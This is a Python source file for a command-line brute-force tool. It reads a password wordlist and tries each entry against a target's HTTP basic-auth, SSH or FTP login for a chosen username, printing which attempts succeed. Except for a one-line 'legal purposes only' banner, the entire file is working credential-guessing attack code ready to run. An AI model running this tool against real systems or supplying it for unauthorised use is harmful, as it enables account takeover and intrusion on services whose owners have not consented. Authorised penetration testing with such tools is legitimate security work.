# File: /bruteforce-cli/bruteforce-cli/src/bruteforce/bruteforce.py
import requests
import paramiko
from ftplib import FTP
import threading
import time
import os
import sys
from datetime import datetime

print("Welcome to bruteforcer. A password cracking tool for all services. Please use this tool for legal purposes only. Black hat hacking is highly discouraged and we take no responsibility in legal consequences")

class PasswordCracker:
    def __init__(self, target, protocol, username, wordlist):
        self.target = target
        self.protocol = protocol.lower()
        self.username = username
        self.wordlist = wordlist
        self.found = False
        self.attempts = []  # Store attempt results
        
    def print_table_header(self):
        print("\n" + "="*60)
        print(f"{'PASSWORD':<20} {'STATUS':<15} {'TIME':<20}")
        print("="*60)
        
    def print_table_row(self, password, success):
        status = "SUCCESS" if success else "FAILED"
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(f"{password:<20} {status:<15} {timestamp:<20}")
        
    def http_auth_crack(self, password):
        try:
            response = requests.get(
                self.target,
                auth=(self.username, password),
                timeout=5
            )
            if response.status_code == 200:
                self.print_table_row(password, True)
                print(f"\n[+] HTTP Success: {self.username}/{password}")
                self.found = True
                return True
            else:
                self.print_table_row(password, False)
        except requests.exceptions.RequestException:
            self.print_table_row(password, False)
        except Exception:
            self.print_table_row(password, False)
        return False
    
    def ssh_crack(self, password):
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(
                self.target,
                username=self.username,
                password=password,
                timeout=5
            )
            self.print_table_row(password, True)
            print(f"\n[+] SSH Success: {self.username}/{password}")
            ssh.close()
            self.found = True
            return True
        except paramiko.AuthenticationException:
            self.print_table_row(password, False)
        except Exception:
            self.print_table_row(password, False)
        return False
    
    def ftp_crack(self, password):
        try:
            ftp = FTP()
            ftp.connect(self.target, 21, timeout=5)
            ftp.login(self.username, password)
            self.print_table_row(password, True)
            print(f"\n[+] FTP Success: {self.username}/{password}")
            ftp.quit()
            self.found = True
            return True
        except Exception:
            self.print_table_row(password, False)
        return False
    
    def crack_password(self):
        # Check if wordlist file exists
        if not os.path.exists(self.wordlist):
            print(f"Error: Wordlist file '{self.wordlist}' not found.")
            return False
            
        try:
            with open(self.wordlist, 'r', encoding='utf-8', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"Error reading wordlist file: {e}")
            return False
        
        if not passwords:
            print("Error: Wordlist file is empty or unreadable.")
            return False
            
        print(f"[*] Starting brute force attack on {self.protocol}://{self.target}")
        print(f"[*] Username: {self.username}")
        print(f"[*] Wordlist contains {len(passwords)} passwords")
        self.print_table_header()
        
        for password in passwords:
            if self.found:
                break
                
            if self.protocol == 'http':
                if self.http_auth_crack(password):
                    break
            elif self.protocol == 'ssh':
                if self.ssh_crack(password):
                    break
            elif self.protocol == 'ftp':
                if self.ftp_crack(password):
                    break
            else:
                print(f"Error: Unsupported protocol '{self.protocol}'")
                return False
            
            time.sleep(0.1)  # Rate limiting
            
        if not self.found:
            print("\n[-] Password not found in wordlist.")
        return self.found
